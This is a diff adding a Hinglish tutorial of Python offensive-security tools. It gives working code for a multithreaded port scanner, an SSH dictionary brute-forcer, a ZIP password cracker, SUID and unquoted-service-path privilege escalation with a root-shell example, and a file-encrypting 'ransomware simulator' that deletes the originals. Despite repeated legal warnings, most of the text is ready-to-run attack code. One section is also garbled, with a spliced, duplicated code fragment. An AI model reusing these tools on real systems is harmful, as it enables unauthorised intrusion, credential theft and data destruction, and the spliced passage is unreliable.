@@ -3395,4 +3395,1092 @@ Sirf authorized purposes ke liye use karo. Bug bounty programs, HackTheBox, TryH
 4. Participate in bug bounty programs
 5. Get certified (CEH, OSCP)
 
-**Thank you for completing Module 12! Stay ethical, stay legal! 🔐🚀**
+# Additional Python Hacking Tools - Complete Guide
+
+## ⚠️ LEGAL WARNING
+
+**🚨 PEHLE YEH PADHO! 🚨**
+
+Yeh tools sirf **AUTHORIZED TESTING** ke liye hain. Bina permission use karna **ILLEGAL** hai.
+
+---
+
+# TOOL 1: Port Scanner
+
+**Difficulty:** ⭐⭐ (Easy to Moderate)  
+**Libraries:** socket, scapy, python-nmap  
+**Reality:** Bahut easy! Python ka port scanner Nmap jaisa powerful ban sakta hai.
+
+## 1.1 Understanding Port Scanning
+
+### Hinglish Explanation:
+
+**Kya hai yeh?**  
+Port Scanner - network par open ports discover karta hai. Har service ek specific port par run hoti hai (HTTP=80, SSH=22).
+
+**Kyun zaroori hai?**  
+Penetration testing mein sabse pehle yeh pata karna hota hai ki target par kaunsi services run ho rahi hain.
+
+**Kab use karna?**  
+Network reconnaissance phase mein.
+
+**Real-world Example:**  
+Pentester company ke server scan karta hai. Port 22 (SSH) open hai but outdated version hai - vulnerability mil gayi.
+
+### Port Scanning Types:
+
+| Type | Description | Speed | Stealth |
+|------|-------------|-------|---------|
+| **TCP Connect** | Full 3-way handshake | Slow | Low |
+| **TCP SYN** | Half-open scan | Fast | High |
+| **UDP** | UDP ports scan | Slow | Medium |
+| **Service Detection** | Version identify | Slow | Low |
+
+---
+
+## 1.2 Basic Port Scanner
+
+### Line-by-Line Code Example:
+
+```python
+#!/usr/bin/env python3
+# Line 1: Shebang - Python 3 use karo
+
+import socket
+# Line 2: socket module - network connections ke liye
+from datetime import datetime
+# Line 3: datetime - timestamp ke liye
+
+def scan_port(target, port):
+    # Line 5: Function to scan single port
+    # target = IP address (string)
+    # port = port number (integer)
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Line 7: Socket object banao
+        # AF_INET = IPv4 address family
+        # SOCK_STREAM = TCP protocol
+        # Kya hota hai? Network connection ke liye socket create hota hai
+        
+        sock.settimeout(1)
+        # Line 8: Timeout set karo (1 second)
+        # Kya hota hai? Agar 1 second mein response nahi aaya, timeout
+        # Kyun? Bina timeout ke closed ports par bahut time waste hoga
+        
+        result = sock.connect_ex((target, port))
+        # Line 9: Connection try karo
+        # connect_ex() = connect attempt karta hai, error code return karta hai
+        # Return value: 0 = success (port open), non-zero = failed (port closed)
+        # Kya hota hai? Target IP ke specific port par connection try hota hai
+        
+        sock.close()
+        # Line 10: Socket band karo
+        # Kya hota hai? Connection close ho jaata hai
+        # Kyun? Resources free karne ke liye
+        
+        return result == 0
+        # Line 11: True return karo agar port open hai
+        # result == 0 means connection successful
+        
+    except:
+        # Line 12: Agar koi error aaye
+        return False
+        # Line 13: False return karo (port closed ya error)
+
+def port_scanner(target, start_port, end_port):
+    # Line 15: Main scanner function
+    # target = IP address to scan
+    # start_port = starting port number
+    # end_port = ending port number
+    
+    print(f"[*] Scanning {target}")
+    # Line 16: User ko inform karo kya scan ho raha hai
+    # [*] = information indicator
+    
+    print(f"[*] Time started: {datetime.now()}")
+    # Line 17: Start time print karo
+    # datetime.now() = current date/time
+    # Kya hota hai? Scan kitna time lega, yeh track karne ke liye
+    
+    open_ports = []
+    # Line 18: Empty list - open ports store karne ke liye
+    
+    for port in range(start_port, end_port + 1):
+        # Line 19: Har port ko loop mein scan karo
+        # range(1, 1001) = 1 se 1000 tak
+        # Kya hota hai? Ek-ek karke har port check hoga
+        
+        if scan_port(target, port):
+            # Line 20: Agar port open hai
+            print(f"[+] Port {port} is OPEN")
+            # Line 21: Open port print karo
+            # [+] = success indicator
+            open_ports.append(port)
+            # Line 22: List mein add karo
+    
+    print(f"\n[*] Scan complete. Found {len(open_ports)} open ports")
+    # Line 23: Summary print karo
+    # len(open_ports) = kitne ports open hain
+    
+    return open_ports
+    # Line 24: Open ports list return karo
+
+# Usage
+target = "192.168.1.1"
+# Line 26: Target IP set karo
+port_scanner(target, 1, 1000)
+# Line 27: Scanner run karo (ports 1-1000)
+```
+
+**Breakdown:**
+- **socket.AF_INET:** IPv4 address family
+- **socket.SOCK_STREAM:** TCP protocol (connection-oriented)
+- **connect_ex():** Returns 0 if port open, error code if closed
+- **settimeout(1):** 1 second timeout (fast scanning)
+
+**Expected Output:**
+```
+[*] Scanning 192.168.1.1
+[*] Time started: 2025-01-15 10:30:45.123456
+[+] Port 22 is OPEN
+[+] Port 80 is OPEN
+[+] Port 443 is OPEN
+
+[*] Scan complete. Found 3 open ports
+```
+
+---
+
+## 1.3 Multi-threaded Scanner
+
+### Line-by-Line Code Example:
+
+```python
+#!/usr/bin/env python3
+import socket
+# Line 2: Socket module for network connections
+import threading
+# Line 3: Threading module - multiple threads ke liye
+from queue import Queue
+# Line 4: Queue - thread-safe data structure
+
+open_ports = []
+# Line 6: Global list - open ports store karne ke liye
+lock = threading.Lock()
+# Line 7: Lock object - race condition prevent karne ke liye
+# Kya hai? Multiple threads ek saath list modify na karein
+
+def scan_port(target, port):
+    # Line 9: Single port scan function
+    try:
+        sock = socket.socket()
+        # Line 11: Socket create karo
+        sock.settimeout(1)
+        # Line 12: 1 second timeout
+        sock.connect((target, port))
+        # Line 13: Connection try karo
+        # Kya hota hai? Agar successful, port open hai
+        
+        with lock:
+            # Line 14: Lock acquire karo
+            # Kya hota hai? Ek time par sirf ek thread list modify kar sakta hai
+            # Kyun? Race condition prevent karne ke liye
+            open_ports.append(port)
+            # Line 15: Port ko list mein add karo
+            print(f"[+] Port {port} OPEN")
+            # Line 16: Print karo
+        # Line 17: Lock automatically release ho jaata hai
+        
+        sock.close()
+        # Line 18: Socket close karo
+    except:
+        # Line 19: Agar connection fail (port closed)
+        pass
+        # Line 20: Kuch mat karo, next port par jao
+
+def worker(target, queue):
+    # Line 22: Worker thread function
+    # Har thread yeh function run karega
+    
+    while not queue.empty():
+        # Line 23: Jab tak queue mein ports hain
+        # Kya hota hai? Loop chalta rahega jab tak kaam hai
+        
+        port = queue.get()
+        # Line 24: Queue se ek port nikalo
+        # Kya hota hai? Thread ko ek port milta hai scan karne ke liye
+        
+        scan_port(target, port)
+        # Line 25: Port scan karo
+        
+        queue.task_done()
+        # Line 26: Queue ko batao ki task complete hua
+        # Kya hota hai? Queue track karta hai kitne tasks pending hain
+
+def fast_scanner(target, ports, threads=100):
+    # Line 28: Main fast scanner function
+    # threads=100 = 100 threads parallel mein run honge
+    
+    queue = Queue()
+    # Line 29: Queue object banao
+    # Kya hai? Thread-safe queue jisme ports store honge
+    
+    for port in ports:
+        # Line 30: Har port ko queue mein dalo
+        queue.put(port)
+        # Line 31: Port queue mein add karo
+        # Kya hota hai? Saare ports queue mein aa jaate hain
+    
+    for _ in range(threads):
+        # Line 32: 100 threads create karo
+        # _ = variable naam ki zaroorat nahi (loop counter)
+        
+        t = threading.Thread(target=worker, args=(target, queue))
+        # Line 33: Thread object banao
+        # target=worker = yeh function run hoga
+        # args=(target, queue) = function ko yeh arguments milenge
+        # Kya hota hai? Ek thread create hota hai
+        
+        t.daemon = True
+        # Line 34: Daemon thread banao
+        # Kya hai? Main program exit hone par yeh thread bhi exit ho jaayega
+        # Kyun? Hanging threads prevent karne ke liye
+        
+        t.start()
+        # Line 35: Thread start karo
+        # Kya hota hai? Thread execute hona shuru ho jaata hai
+    
+    queue.join()
+    # Line 36: Wait karo jab tak saare tasks complete na ho jaayein
+    # Kya hota hai? Main thread wait karega
+    # Kyun? Saare ports scan hone ke baad hi result dikhana hai
+    
+    return open_ports
+    # Line 37: Open ports list return karo
+
+# Usage
+target = "192.168.1.1"
+# Line 39: Target IP
+ports = range(1, 65536)
+# Line 40: All 65535 ports
+fast_scanner(target, ports, threads=200)
+# Line 41: 200 threads ke saath scan karo
+# Kya hota hai? 200 ports parallel mein scan honge - BAHUT FAST!
+```
+
+**Breakdown:**
+- **Threading:** Multiple ports simultaneously scan hote hain
+- **Queue:** Thread-safe data structure (race condition prevent)
+- **Lock:** Shared resource (list) ko protect karta hai
+- **daemon=True:** Main program exit par threads bhi exit
+
+**Speed Comparison:**
+```
+Basic Scanner (1000 ports): ~1000 seconds (16 minutes)
+Multi-threaded (1000 ports): ~10 seconds
+Speed increase: 100x faster!
+```
+
+**Expected Output:**
+```
+[+] Port 22 OPEN
+[+] Port 80 OPEN
+[+] Port 443 OPEN
+[+] Port 3306 OPEN
+...
+```
+
+**Ethical Tip:** ⚠️ Port scanning bina permission illegal hai. Sirf apne network par karo.
+
+---
+
+# TOOL 2: Password Cracker
+
+**Difficulty:** ⭐⭐ (Easy to Moderate)  
+**Libraries:** socket, paramiko, ftplib, requests  
+**Reality:** Complete control! Python mein sab protocols support hain.
+
+## 2.1 Understanding Password Attacks
+
+### Hinglish Explanation:
+
+**Kya hai yeh?**  
+Password Cracker - brute force ya dictionary attack se passwords crack karta hai.
+
+**Kyun zaroori hai?**  
+Weak passwords identify karne ke liye.
+
+**Kab use karna?**  
+Password policy testing mein.
+
+**Real-world Example:**  
+Company ke SSH servers par weak passwords check karte hain.
+
+### Attack Types:
+
+| Type | Description | Speed | Success Rate |
+|------|-------------|-------|--------------|
+| **Brute Force** | Sab combinations try | Very Slow | 100% (eventually) |
+| **Dictionary** | Common passwords | Fast | 60-70% |
+| **Hybrid** | Dictionary + variations | Medium | 80-85% |
+
+---
+
+## 2.2 SSH Brute Force
+
+### Line-by-Line Code Example:
+
+```python
+#!/usr/bin/env python3
+import paramiko
+# Line 2: paramiko - SSH client library
+# Install: pip install paramiko
+import sys
+# Line 3: sys module - system operations ke liye
+
+def ssh_bruteforce(target, username, password_list):
+    # Line 5: Brute force function
+    # target = SSH server IP
+    # username = target username
+    # password_list = passwords ki list
+    
+    ssh = paramiko.SSHClient()
+    # Line 6: SSH client object banao
+    # Kya hai? SSH connections manage karta hai
+    
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    # Line 7: Host key policy set karo
+    # Kya karta hai? Unknown hosts ko automatically accept kar leta hai
+    # Kyun? Testing mein har baar manually accept nahi karna padega
+    # Security Note: Production mein yeh risky hai!
+    
+    for password in password_list:
+        # Line 8: Har password try karo
+        # Kya hota hai? List mein se ek-ek password test hoga
+        
+        try:
+            ssh.connect(target, username=username, password=password, timeout=3)
+            # Line 9: SSH connection try karo
+            # target = server IP
+            # username = login username
+            # password = current password (list se)
+            # timeout=3 = 3 seconds wait karo
+            # Kya hota hai? SSH login attempt hota hai
+            
+            print(f"[+] Password found: {password}")
+            # Line 10: Success message
+            # Kya hota hai? Correct password mil gaya!
+            
+            ssh.close()
+            # Line 11: Connection close karo
+            
+            return password
+            # Line 12: Password return karo aur function exit karo
+            # Kya hota hai? Password mil gaya, aage try karne ki zaroorat nahi
+            
+        except paramiko.AuthenticationException:
+            # Line 13: Agar authentication fail (wrong password)
+            print(f"[-] Failed: {password}")
+            # Line 14: Failed message
+            # [-] = failure indicator
+            # Kya hota hai? Wrong password tha, next try karo
+            
+        except:
+            # Line 15: Agar koi aur error (network, timeout, etc.)
+            print(f"[!] Connection error")
+            # Line 16: Error message
+            # [!] = warning/error indicator
+            return None
+            # Line 17: None return karo (error ki wajah se stop)
+    
+    return None
+    # Line 18: Agar koi password match nahi hua
+    # Kya hota hai? Saare passwords try ho gaye, koi kaam nahi aaya
+
+# Usage
+target = "192.168.1.100"
+# Line 20: Target SSH server
+username = "admin"
+# Line 21: Target username
+passwords = ["admin", "password", "123456", "root"]
+# Line 22: Password list (dictionary attack)
+result = ssh_bruteforce(target, username, passwords)
+# Line 23: Function call
+
+if result:
+    print(f"\n[+] SUCCESS! Password is: {result}")
+else:
+    print("\n[-] Password not found in list")
+```
+
+**Breakdown:**
+- **paramiko.SSHClient():** SSH connection manager
+- **AutoAddPolicy():** Unknown hosts ko accept karta hai
+- **AuthenticationException:** Wrong password exception
+- **timeout=3:** 3 seconds wait (slow servers ke liye)
+
+**Expected Output:**
+```
+[-] Failed: admin
+[-] Failed: password
+[+] Password found: 123456
+
+[+] SUCCESS! Password is: 123456
+```
+
+**Real-world Usage:**
+```python
+# Dictionary file se passwords load karo
+with open("rockyou.txt", "r") as f:
+    passwords = f.read().splitlines()
+
+ssh_bruteforce("192.168.1.100", "root", passwords)
+```
+
+---
+
+## 2.3 ZIP Password Cracker
+
+### Line-by-Line Code Example:
+
+```python
+#!/usr/bin/env python3
+import zipfile
+# Line 2: zipfile module - ZIP files handle karne ke liye
+# Built-in module hai, install ki zaroorat nahi
+
+def crack_zip(zip_file, password_list):
+    # Line 4: ZIP cracker function
+    # zip_file = ZIP file ka path (string)
+    # password_list = passwords ki list
+    
+    zip_obj = zipfile.ZipFile(zip_file)
+    # Line 5: ZIP file object banao
+    # Kya hota hai? ZIP file open ho jaati hai
+    # Kyun? Extract karne ke liye access chahiye
+    
+    for password in password_list:
+        # Line 6: Har password try karo
+        # Kya hota hai? List se ek-ek password test hoga
+        
+        try:
+            zip_obj.extractall(pwd=password.encode())
+            # Line 7: ZIP extract karne ki koshish karo
+            # extractall() = saari files extract karo
+            # pwd = password parameter
+            # password.encode() = string ko bytes mein convert karo
+            # Kya hota hai? Agar password correct hai, files extract hongi
+            # Agar wrong hai, exception throw hoga
+            
+            print(f"[+] Password found: {password}")
+            # Line 8: Success message
+            # Kya hota hai? Correct password mil gaya!
+            
+            return password
+            # Line 9: Password return karo aur exit
+            # Kya hota hai? Password mil gaya, aage try karne ki zaroorat nahi
+            
+        except:
+            # Line 10: Agar extraction fail (wrong password)
+            print(f"[-] Failed: {password}")
+            # Line 11: Failed message
+            # Kya hota hai? Wrong password tha, next try karo
+    
+    return None
+    # Line 12: Agar koi password match nahi hua
+
+# Usage
+passwords = open("rockyou.txt", "r").readlines()
+# Line 14: Password file se passwords load karo
+# rockyou.txt = famous password dictionary (14 million passwords)
+# readlines() = har line ko list item banata hai
+# Kya hota hai? File ke saare passwords list mein aa jaate hain
+
+crack_zip("protected.zip", passwords)
+# Line 15: Cracker run karo
+```
+
+**Breakdown:**
+- **zipfile.ZipFile():** ZIP file object
+- **extractall():** Saari files extract karta hai
+- **pwd parameter:** Password bytes format mein chahiye
+- **encode():** String ko bytes mein convert karta hai
+
+**Expected Output:**
+```
+[-] Failed: password
+[-] Failed: 123456
+[-] Failed: qwerty
+[+] Password found: secret123
+```
+
+**Advanced Version (with progress):**
+```python
+def crack_zip_advanced(zip_file, password_list):
+    zip_obj = zipfile.ZipFile(zip_file)
+    total = len(password_list)
+    
+    for i, password in enumerate(password_list, 1):
+        # Line 5: enumerate() - index ke saath loop
+        # i = current index (1 se start)
+        
+        try:
+            zip_obj.extractall(pwd=password.strip().encode())
+            # strip() - newline characters remove karo
+            print(f"\n[+] Password found: {password.strip()}")
+            print(f"[*] Tried {i}/{total} passwords")
+            return password.strip()
+        except:
+            print(f"\r[*] Trying: {password.strip()} ({i}/{total})", end="")
+            # \r = carriage return (same line par overwrite)
+            # end="" = newline mat do
+    
+    print("\n[-] Password not found")
+    return None
+```
+
+**Ethical Tip:** ⚠️ Password cracking sirf apni files par karo. Dusre ki files crack karna illegal hai.
+
+---
+
+# TOOL 3: Privilege Escalation Scripts
+
+**Difficulty:** ⭐⭐⭐ (Moderate)  
+**Libraries:** os, subprocess, winreg, ctypes  
+**Reality:** Totally possible! Python OS-level access de sakta hai.
+
+## 3.1 Understanding Privilege Escalation
+
+### Hinglish Explanation:
+
+**Kya hai yeh?**  
+Privilege Escalation - low-privilege user se high-privilege (root/admin) access lena.
+
+**Kyun zaroori hai?**  
+Initial access limited hota hai. Full control ke liye escalation zaroori hai.
+
+**Kab use karna?**  
+Post-exploitation phase mein.
+
+**Real-world Example:**  
+Pentester web server compromise karta hai (www-data user). Privilege escalation se root access le leta hai.
+
+---
+
+## 3.2 Linux SUID Enumeration
+
+### Line-by-Line Code Example:
+
+```python
+#!/usr/bin/env python3
+import subprocess
+# Line 2: subprocess - system commands run karne ke liye
+
+def find_suid_binaries():
+    # Line 4: SUID binaries dhundhne ka function
+    # SUID = Set User ID (file owner ke permissions se run hota hai)
+    # Kya hai? Agar SUID binary vulnerable hai, privilege escalation ho sakta hai
+    
+    print("[*] Finding SUID binaries...")
+    # Line 5: User ko inform karo
+    
+    cmd = "find / -perm -4000 -type f 2>/dev/null"
+    # Line 6: Linux find command
+    # find / = root directory se search karo
+    # -perm -4000 = SUID bit set hai (4000 = SUID permission)
+    # -type f = sirf files (directories nahi)
+    # 2>/dev/null = errors ko suppress karo (permission denied messages)
+    # Kya karta hai? Puri system mein SUID files dhundhta hai
+    
+    result = subprocess.check_output(cmd, shell=True).decode()
+    # Line 7: Command run karo aur output lo
+    # check_output() = command ka output return karta hai
+    # shell=True = shell mein execute karo
+    # decode() = bytes ko string mein convert karo
+    # Kya hota hai? Command execute hota hai, output string mein milta hai
+    
+    suid_files = result.strip().split('\n')
+    # Line 8: Output ko list mein convert karo
+    # strip() = extra whitespace remove karo
+    # split('\n') = har line ko alag list item banao
+    # Kya hota hai? Har file path ek list item ban jaata hai
+    
+    print(f"[+] Found {len(suid_files)} SUID binaries:\n")
+    # Line 9: Total count print karo
+    # len(suid_files) = kitni files mili
+    
+    for file in suid_files:
+        # Line 10: Har file ko print karo
+        print(f"  {file}")
+        # Line 11: File path print karo (indented)
+    
+    return suid_files
+    # Line 12: List return karo
+
+# Usage
+suid_list = find_suid_binaries()
+# Line 14: Function call
+
+# Vulnerable SUID binaries check karo
+vulnerable = ["/usr/bin/nmap", "/usr/bin/vim", "/usr/bin/find"]
+for binary in suid_list:
+    if any(vuln in binary for vuln in vulnerable):
+        print(f"\n[!] VULNERABLE: {binary}")
+        print(f"[*] Check GTFOBins for exploitation: https://gtfobins.github.io/")
+```
+
+**Breakdown:**
+- **find command:** Linux file search utility
+- **-perm -4000:** SUID permission bit
+- **2>/dev/null:** Error suppression
+- **GTFOBins:** Database of SUID exploitation techniques
+
+**Expected Output:**
+```
+[*] Finding SUID binaries...
+[+] Found 47 SUID binaries:
+
+  /usr/bin/sudo
+  /usr/bin/passwd
+  /usr/bin/nmap
+  /usr/bin/find
+  ...
+
+[!] VULNERABLE: /usr/bin/nmap
+[*] Check GTFOBins for exploitation: https://gtfobins.github.io/
+```
+
+**Why SUID is Dangerous:**
+```bash
+# Example: nmap with SUID
+# Normal user can run as root!
+nmap --interactive
+nmap> !sh
+# Now you have root shell!
+```
+
+---
+
+## 3.3 Windows Unquoted Service Paths
+
+### Line-by-Line Code Example:
+
+```python
+#!/usr/bin/env python3
+import subprocess
+# Line 2: subprocess module
+
+def find_unquoted_services():
+    # Line 4: Unquoted service paths dhundhne ka function
+    # Kya hai? Windows services jinka path quotes mein nahi hai
+    # Kyun vulnerable? Spaces wale paths mein DLL hijacking ho sakta hai
+    
+    print("[*] Checking for unquoted service paths...")
+    # Line 5: User ko inform karo
+    
+    cmd = 'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """'
+    # Line 6: Windows command
+    # wmic service get name,pathname = saari services ki details
+    # | = pipe (output ko next command mein bhejo)
+    # findstr /i /v "C:\\Windows\\\\" = Windows folder ko exclude karo
+    #   /i = case insensitive
+    #   /v = invert match (jo match nahi kare woh dikhao)
+    # findstr /i /v """ = quoted paths ko exclude karo
+    # Kya karta hai? Non-Windows, unquoted service paths dhundhta hai
+    
+    result = subprocess.check_output(cmd, shell=True).decode()
+    # Line 7: Command run karo
+    # Kya hota hai? Vulnerable services ki list milti hai
+    
+    print("[+] Vulnerable services:")
+    # Line 8: Header print karo
+    print(result)
+    # Line 9: Results print karo
+
+# Usage
+find_unquoted_services()
+# Line 11: Function call
+```
+
+**Breakdown:**
+- **wmic:** Windows Management Instrumentation Command
+- **findstr:** Windows grep equivalent
+- **/i:** Case insensitive search
+- **/v:** Invert match (exclude)
+
+**Expected Output:**
+```
+[*] Checking for unquoted service paths...
+[+] Vulnerable services:
+MyService    C:\Program Files\My App\service.exe
+TestService  C:\Program Files\Test Service\test.exe
+```
+
+**Why Unquoted Paths are Vulnerable:**
+```
+Service Path: C:\Program Files\My App\service.exe
+
+Windows tries to execute in this order:
+1. C:\Program.exe
+2. C:\Program Files\My.exe
+3. C:\Program Files\My App\service.exe
+
+Attacker can place malicious Program.exe in C:\
+Service restart par attacker ka code SYSTEM privileges se run hoga!
+```
+
+**Exploitation Example:**
+```python
+def exploit_unquoted_path(service_name, malicious_exe):
+    # Step 1: Service path nikalo
+    cmd = f'sc qc "{service_name}"'
+    result = subprocess.check_output(cmd, shell=True).decode()
+    
+    # Step 2: Unquoted path parse karo
+    # Example: C:\Program Files\My App\service.exe
+    # Exploit: C:\Program.exe place karo
+    
+    print(f"[*] Place {malicious_exe} at C:\\Program.exe")
+    print(f"[*] Restart service: sc stop {service_name} && sc start {service_name}")
+    print(f"[+] Malicious code will run as SYSTEM!")
+```
+
+**Ethical Tip:** ⚠️ Privilege escalation sirf authorized testing mein. Production systems par mat karo.
+
+---
+
+# TOOL 4: Encryption/Decryption Tools
+
+**Difficulty:** ⭐⭐ (Easy to Moderate)  
+**Libraries:** cryptography, pycryptodome, Crypto  
+**Reality:** Bahut easy! Professional-grade encryption implement kar sakte ho.
+
+## 4.1 Understanding Encryption
+
+### Hinglish Explanation:
+
+**Kya hai yeh?**  
+Encryption - data ko unreadable format mein convert karna. Sirf key wala decrypt kar sakta hai.
+
+**Kyun zaroori hai?**  
+Data protection, secure communication ke liye.
+
+**Kab use karna?**  
+Sensitive data store/transfer karte waqt.
+
+**Real-world Example:**  
+Company confidential documents encrypt karke cloud par store karti hai.
+
+### Algorithms:
+
+| Algorithm | Key Size | Speed | Security |
+|-----------|----------|-------|----------|
+| **AES** | 128/192/256-bit | Fast | Very High |
+| **RSA** | 2048/4096-bit | Slow | Very High |
+| **DES** | 56-bit | Fast | Low (deprecated) |
+| **ChaCha20** | 256-bit | Very Fast | Very High |
+
+---
+
+## 4.2 File Encryptor (AES)
+
+### Line-by-Line Code Example:
+
+```python
+#!/usr/bin/env python3
+from Crypto.Cipher import AES
+# Line 2: AES cipher import karo
+# Install: pip install pycryptodome
+from Crypto.Random import get_random_bytes
+# Line 3: Random bytes generator
+from Crypto.Protocol.KDF import PBKDF2
+# Line 4: Key Derivation Function
+# PBKDF2 = Password-Based Key Derivation Function 2
+import os
+# Line 5: OS operations ke liye
+
+class FileEncryptor:
+    # Line 7: File encryption class
+    
+    def __init__(self, password):
+        # Line 9: Constructor
+        # password = user ka password (string)
+        
+        self.password = password.encode()
+        # Line 10: Password ko bytes mein convert karo
+        # encode() = string to bytes
+        # Kya hota hai? Crypto functions bytes chahte hain
+    
+    def encrypt_file(self, input_file, output_file):
+        # Line 12: File encryption method
+        # input_file = original file path
+        # output_file = encrypted file path
+        
+        salt = get_random_bytes(32)
+        # Line 13: Random salt generate karo (32 bytes)
+        # Kya hai? Random data jo key derivation mein use hota hai
+        # Kyun? Same password se different keys banane ke liye
+        # Security: Rainbow table attacks prevent karta hai
+        
+        key = PBKDF2(self.password, salt, dkLen=32)
+        # Line 14: Password se encryption key derive karo
+        # PBKDF2() = secure key derivation function
+        # dkLen=32 = 32 bytes key (AES-256)
+        # Kya hota hai? Password + salt se strong key banta hai
+        # Kyun? Direct password use karna insecure hai
+        
+        cipher = AES.new(key, AES.MODE_EAX)
+        # Line 15: AES cipher object banao
+        # MODE_EAX = Authenticated encryption mode
+        # Kya hai? Encryption + authentication dono
+        # Kyun? Tampering detect karne ke liye
+        
+        with open(input_file, 'rb') as f:
+            # Line 16: Input file open karo (read binary mode)
+            # 'rb' = read binary
+            plaintext = f.read()
+            # Line 17: Puri file read karo
+            # Kya hota hai? File ka data memory mein aa jaata hai
+        
+        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
+        # Line 18: Data encrypt karo
+        # encrypt_and_digest() = encrypt + authentication tag generate
+        # ciphertext = encrypted data
+        # tag = authentication tag (tampering detect karne ke liye)
+        # Kya hota hai? Plaintext encrypted ho jaata hai
+        
+        with open(output_file, 'wb') as f:
+            # Line 19: Output file open karo (write binary mode)
+            # 'wb' = write binary
+            f.write(salt)
+            # Line 20: Salt write karo (decryption ke liye chahiye)
+            f.write(cipher.nonce)
+            # Line 21: Nonce write karo (AES EAX mode ke liye)
+            f.write(tag)
+            # Line 22: Authentication tag write karo
+            f.write(ciphertext)
+            # Line 23: Encrypted data write karo
+        # Kya hota hai? Encrypted file ban jaati hai
+        
+        print(f"[+] File encrypted: {output_file}")
+        # Line 24: Success message
+    
+    def decrypt_file(self, input_file, output_file):
+        # Line 26: File decryption method
+        
+        with open(input_file, 'rb') as f:
+            # Line 27: Encrypted file open karo
+            salt = f.read(32)
+            # Line 28: Salt read karo (first 32 bytes)
+            nonce = f.read(16)
+            # Line 29: Nonce read karo (next 16 bytes)
+            tag = f.read(16)
+            # Line 30: Tag read karo (next 16 bytes)
+            ciphertext = f.read()
+            # Line 31: Baki sab encrypted data hai
+        # Kya hota hai? File ke components alag ho gaye
+        
+        key = PBKDF2(self.password, salt, dkLen=32)
+        # Line 32: Same key derive karo (password + salt)
+        # Kya hota hai? Encryption wali key wapas ban jaati hai
+        
+        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
+        # Line 33: Cipher object banao (same nonce ke saath)
+        
+        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+        # Line 34: Decrypt karo aur verify karo
+        # decrypt_and_verify() = decrypt + authentication check
+        # Kya hota hai? Agar tag match nahi hua, exception throw hoga
+        # Kyun? Tampering detect karne ke liye
+        
+        with open(output_file, 'wb') as f:
+            # Line 35: Output file open karo
+            f.write(plaintext)
+            # Line 36: Decrypted data write karo
+        # Kya hota hai? Original file wapas aa gayi
+        
+        print(f"[+] File decrypted: {output_file}")
+        # Line 37: Success message
+
+# Usage
+encryptor = FileEncryptor("my_strong_password")
+# Line 39: Encryptor object banao
+encryptor.encrypt_file("document.pdf", "document.pdf.enc")
+# Line 40: File encrypt karo
+encryptor.decrypt_file("document.pdf.enc", "document_decrypted.pdf")
+# Line 41: File decrypt karo
+```
+
+**Breakdown:**
+- **PBKDF2:** Password se secure key derive karta hai
+- **Salt:** Rainbow table attacks prevent karta hai
+- **AES-256:** Industry-standard encryption (32-byte key)
+- **MODE_EAX:** Authenticated encryption (tampering detect)
+- **Nonce:** Number used once (replay attacks prevent)
+
+**File Structure:**
+```
+Encrypted File Format:
+[Salt: 32 bytes][Nonce: 16 bytes][Tag: 16 bytes][Ciphertext: variable]
+
+Total overhead: 64 bytes
+```
+
+**Expected Output:**
+```
+[+] File encrypted: document.pdf.enc
+[+] File decrypted: document_decrypted.pdf
+```
+
+**Security Features:**
+1. **Strong encryption:** AES-256 (military-grade)
+2. **Key derivation:** PBKDF2 (brute force resistant)
+3. **Authentication:** Tag tampering detect karta hai
+4. **Unique keys:** Salt har encryption mein different key banata haiile, 'wb') as f:
+            f.write(salt)
+            f.write(cipher.nonce)
+            f.write(tag)
+            f.write(ciphertext)
+        
+        print(f"[+] File encrypted: {output_file}")
+    
+    def decrypt_file(self, input_file, output_file):
+        with open(input_file, 'rb') as f:
+            salt = f.read(32)
+            nonce = f.read(16)
+            tag = f.read(16)
+            ciphertext = f.read()
+        
+        key = PBKDF2(self.password, salt, dkLen=32)
+        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
+        
+        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+        
+        with open(output_file, 'wb') as f:
+            f.write(plaintext)
+        
+        print(f"[+] File decrypted: {output_file}")
+
+# Usage
+encryptor = FileEncryptor("my_strong_password")
+encryptor.encrypt_file("document.pdf", "document.pdf.enc")
+encryptor.decrypt_file("document.pdf.enc", "document_decrypted.pdf")
+```
+
+---
+
+## 4.3 Ransomware Simulator (ETHICAL ONLY!)
+
+```python
+#!/usr/bin/env python3
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+import os
+
+class RansomwareSimulator:
+    def __init__(self):
+        self.key = get_random_bytes(32)
+        self.encrypted_files = []
+    
+    def encrypt_directory(self, directory):
+        print("[!] RANSOMWARE SIMULATION - ETHICAL TESTING ONLY")
+        
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                if file.endswith('.txt'):
+                    filepath = os.path.join(root, file)
+                    self.encrypt_file(filepath)
+        
+        print(f"[+] Encrypted {len(self.encrypted_files)} files")
+        print(f"[+] Key: {self.key.hex()}")
+    
+    def encrypt_file(self, filepath):
+        cipher = AES.new(self.key, AES.MODE_EAX)
+        
+        with open(filepath, 'rb') as f:
+            plaintext = f.read()
+        
+        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
+        
+        with open(filepath + '.locked', 'wb') as f:
+            f.write(cipher.nonce + tag + ciphertext)
+        
+        os.remove(filepath)
+        self.encrypted_files.append(filepath)
+    
+    def decrypt_directory(self, directory, key_hex):
+        key = bytes.fromhex(key_hex)
+        
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                if file.endswith('.locked'):
+                    filepath = os.path.join(root, file)
+                    self.decrypt_file(filepath, key)
+        
+        print("[+] Decryption complete")
+    
+    def decrypt_file(self, filepath, key):
+        with open(filepath, 'rb') as f:
+            nonce = f.read(16)
+            tag = f.read(16)
+            ciphertext = f.read()
+        
+        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
+        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+        
+        original_file = filepath.replace('.locked', '')
+        with open(original_file, 'wb') as f:
+            f.write(plaintext)
+        
+        os.remove(filepath)
+
+# Usage (ONLY IN TEST ENVIRONMENT!)
+sim = RansomwareSimulator()
+sim.encrypt_directory("./test_folder")
+# Save the key!
+sim.decrypt_directory("./test_folder", "key_here")
